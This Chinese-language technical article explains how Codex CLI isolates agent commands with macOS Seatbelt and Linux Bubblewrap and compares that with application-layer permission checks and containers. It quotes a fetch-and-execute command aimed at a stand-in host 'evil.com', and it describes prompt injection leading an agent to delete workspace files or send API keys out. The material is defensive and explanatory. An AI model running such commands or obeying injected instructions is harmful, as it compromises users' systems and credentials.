---
layout: default
title: 沙箱与安全模型：平台原生隔离的工程边界
description: 从 macOS Seatbelt 和 Linux Bubblewrap 理解 Codex 选择操作系统级沙箱的工程逻辑
eyebrow: Codex CLI / 03
---

# 沙箱与安全模型：平台原生隔离的工程边界

## 为什么这个问题值得关注

Agent 安全有三种实现路径：

1. **应用层检查**：框架在每次操作前检查权限（Claude Code）
2. **策略引擎**：可编程的审批逻辑（DeepSeek Harness）
3. **平台原生隔离**：操作系统强制限制进程能做什么（Codex CLI）

第三种路径的核心优势是：**安全边界不在你的代码里，在内核里。** 即使你的 Agent 代码有 bug，沙箱策略在内核层面强制执行，绕不过去。

但平台原生隔离也有明确的代价：平台耦合（每个 OS 需要不同实现）、粒度限制（操作系统不理解"这是一个 MCP 工具调用"）、调试困难（沙箱报错信息通常很晦涩）。

Codex CLI 选择了这条路径，用 macOS 的 Seatbelt 和 Linux 的 Bubblewrap 实现。理解它的实现方式和边界条件，能帮你判断什么时候平台沙箱够用，什么时候需要补充其他安全层。

## macOS Seatbelt

Seatbelt 是 macOS 的强制访问控制框架（也叫 sandbox）。它通过 profile 文件声明进程允许的操作——文件读写、网络访问、进程创建等。

### 工作原理

```text
进程启动 → 加载 Seatbelt profile → 内核注册约束 → 后续 syscall 受限
```

一旦进程加载了 Seatbelt profile，约束不可撤销——进程自己不能解除限制。这和 Chrome 的 sandbox 原理一致：renderer 进程一旦进入沙箱就出不来。

### Codex 的 Seatbelt 使用

Codex 在 Rust 层通过 `sandbox_init` 系统调用加载 profile。对应 `workspace-write` 模式，profile 大致允许：

- 读：全部文件系统（`/usr/`, `/Library/`, `~/.codex/` 等）
- 写：当前工作目录及 `writable_roots` 指定的路径
- 网络：允许出站 HTTPS（调用 OpenAI API）
- 进程：允许 fork/exec（执行用户命令）
- 禁止：写工作区外文件、修改系统配置、访问 Keychain

### Seatbelt 的限制

Seatbelt 不是万能的：

**粒度是路径级的。** 你可以说"禁止写 `/etc/`"，但不能说"只允许写 JSON 文件"——Seatbelt 不理解文件格式。

**不区分操作意图。** 模型执行 `rm src/main.ts` 和用户执行 `rm src/main.ts` 在 Seatbelt 看来完全一样。沙箱不知道哪个更危险。

**Apple 不保证接口稳定性。** Seatbelt 的 SBPL (Seatbelt Profile Language) 没有公开文档，只有 Apple 内部和逆向工程的资料。macOS 升级可能改变行为。

**无法限制 CPU/Memory。** Seatbelt 只控制系统调用，不控制资源用量。模型如果触发无限循环，沙箱不会管。

## Linux Bubblewrap

Bubblewrap（bwrap）是一个利用 Linux namespace 实现用户态沙箱的工具。它不需要 root 权限，通过 user namespace + mount namespace + PID namespace 创建隔离环境。

### 工作原理

```text
bwrap --ro-bind / / \
      --bind $PWD $PWD \
      --unshare-net \
      --dev /dev \
      -- /bin/bash
```

这条命令创建一个环境：根文件系统只读挂载，当前目录可写挂载，网络隔离，独立的 /dev。进程在这个环境里看到的文件系统是"改装"过的。

### Codex 的 Bubblewrap 使用

Codex 在 Linux 上通过 Rust 调用 bwrap（或直接使用 namespace syscall）实现类似 macOS Seatbelt 的效果：

| workspace-write 模式下的策略 | 实现 |
| --- | --- |
| 工作区可写 | `--bind $PWD $PWD` |
| 系统文件只读 | `--ro-bind / /` |
| 网络隔离（可选） | `--unshare-net` |
| 独立 PID 空间 | `--unshare-pid` |
| /tmp 独立 | `--tmpfs /tmp` |

### Bubblewrap vs Docker

为什么不直接用 Docker？

**启动速度。** Docker 容器启动需要几百毫秒到几秒。Bubblewrap 的 namespace 操作在毫秒级完成。Agent 的每次工具调用都可能需要新建沙箱环境——启动延迟是关键。

**轻量级。** Docker 需要 daemon、镜像层、存储驱动。Bubblewrap 只是一系列系统调用，没有额外的基础设施依赖。

**权限要求。** Docker daemon 需要 root（或 rootless 模式的额外配置）。Bubblewrap 利用 user namespace，普通用户就能用。

**代价。** Docker 的隔离更完整（网络、存储、cgroup）。Bubblewrap 的隔离在某些维度不如 Docker——比如 cgroup 限制需要额外配置。

## 平台原生沙箱 vs 应用层权限

### Claude Code 的应用层方案

Claude Code 在 TypeScript 中实现权限检查：

```text
用户请求 → 模型决策 → 工具调用 → 权限检查（TS 代码）→ 允许/拒绝
```

权限逻辑在用户空间运行。如果权限检查代码有 bug（逻辑错误、竞态条件、绕过路径），安全边界就不存在了。

### Codex CLI 的平台原生方案

```text
用户请求 → 模型决策 → 工具调用 → OS 沙箱拦截（内核层）→ 允许/EPERM
```

权限逻辑在内核空间执行。即使 Codex 的 Rust 代码有 bug，内核的 Seatbelt/namespace 约束不受影响。

### 安全强度对比

| 维度 | 平台原生 (Codex) | 应用层 (Claude Code) |
| --- | --- | --- |
| 绕过难度 | 极高（需要内核漏洞） | 中（应用逻辑漏洞即可） |
| 覆盖范围 | 所有 syscall | 只有框架控制的操作 |
| 子进程继承 | 自动继承约束 | 需要框架显式传递 |
| 检查时机 | 内核层，无竞态 | 用户空间，可能有 TOCTOU |
| 灵活性 | 低（路径/syscall 级别） | 高（可以理解操作语义） |
| 调试体验 | 差（内核报错晦涩） | 好（可以打日志、给解释） |
| 跨平台 | 每个 OS 需要不同实现 | 统一实现 |

### 关键差异：子进程安全

这是平台原生沙箱最重要的优势。

当模型执行 `bash -c "curl evil.com | bash"` 时：

- **应用层方案**：框架检查了 `bash` 命令是否允许执行。但 `curl evil.com | bash` 是 bash 的子进程行为——框架可能检查不到这一层。
- **平台原生方案**：Seatbelt/namespace 约束继承给所有子进程。即使 bash 尝试 curl，网络限制在内核层面生效。

这就是为什么对安全要求高的场景，平台原生沙箱更可靠——它不假设框架能追踪所有间接行为。

## 2026 年 8 月的安全演进

Codex 的安全模型还在快速演进。根据 GitHub PR 记录，2026 年 8 月集中合并了多个安全相关 MCP PR：

- **PR #39935**：MCP OAuth 端点的 issuer binding——防止 token 被重放到其他 MCP server
- **PR #39962**：Guardian review 与 executor MCP server 隔离——审查进程不能访问执行进程的工具
- OAuth refresh token binding、credential write hardening

这些 PR 表明 Codex 正在建设多租户安全模型——不只是"一个用户一个沙箱"，而是"同一会话中不同角色有不同的访问边界"。这和 DSH 的策略平面思路开始趋同。

## 什么时候平台沙箱不够用

平台原生沙箱解决的是"进程能做什么"的问题。但 Agent 安全还有其他维度：

**Prompt Injection。** 沙箱不防 prompt injection。如果恶意输入让模型"自愿"执行危险操作（且操作在沙箱允许范围内），平台沙箱无能为力。比如模型被注入后删除工作区所有文件——在 `workspace-write` 模式下这是允许的。

**Token/凭据泄露。** 沙箱允许网络出站（调用 API 需要）。如果模型被注入后把环境变量中的 API key 发到外部服务器，沙箱不会阻止——因为出站 HTTPS 是允许的。

**逻辑错误。** 模型把正确的代码改成了错误的代码，但文件写入操作本身在沙箱允许范围内。平台沙箱不理解代码语义。

**资源耗尽。** Seatbelt 和基础的 namespace 不限制 CPU/Memory。需要额外的 cgroup 配置。

这些场景需要应用层的防护——语义理解、内容审查、资源限制。平台沙箱是安全基线（底线保障），不是完整的安全方案。

## 与 Pi 的容器化方案对比

Pi 不做任何运行时安全，推荐用容器（Docker / Gondolin micro-VM）隔离。和 Codex 的区别：

| 维度 | Codex (Seatbelt/bwrap) | Pi (Docker/VM) |
| --- | --- | --- |
| 启动开销 | 毫秒 | 百毫秒到秒 |
| 隔离粒度 | 进程级 | 容器/VM 级 |
| 网络隔离 | 可选 | 默认 |
| 文件系统隔离 | 路径级可写控制 | 完全隔离（挂载共享） |
| 状态持久化 | 天然（宿主文件系统）| 需要 volume mount |
| 适合的调用频率 | 高（每次工具调用）| 低（每次会话） |

Codex 的方案适合"每次工具调用快速进出沙箱"；Pi 推荐的容器方案适合"整个会话在一个隔离环境中运行"。

## 小结

Codex CLI 选择平台原生沙箱的核心逻辑是：**安全边界越靠近内核，越难被绕过。** macOS Seatbelt 和 Linux Bubblewrap 提供了内核级的进程约束，不依赖应用代码的正确性。

这个选择的收益是安全边界极硬（需要内核漏洞才能绕过）、子进程自动继承约束。代价是平台耦合（macOS/Linux 两套实现，不支持 Windows）、粒度有限（只能控制 syscall 和路径，不理解操作语义）、调试困难。

现实中的 Agent 安全需要多层防护：平台沙箱做底线，应用层做语义审查，网络层做出站控制。Codex 的平台沙箱是其中最硬的一层底线，但不能替代其他层。

---

下一篇：[MCP 深度集成：1,100+ PR 背后的设计决策](../04-mcp-integration/index.html)
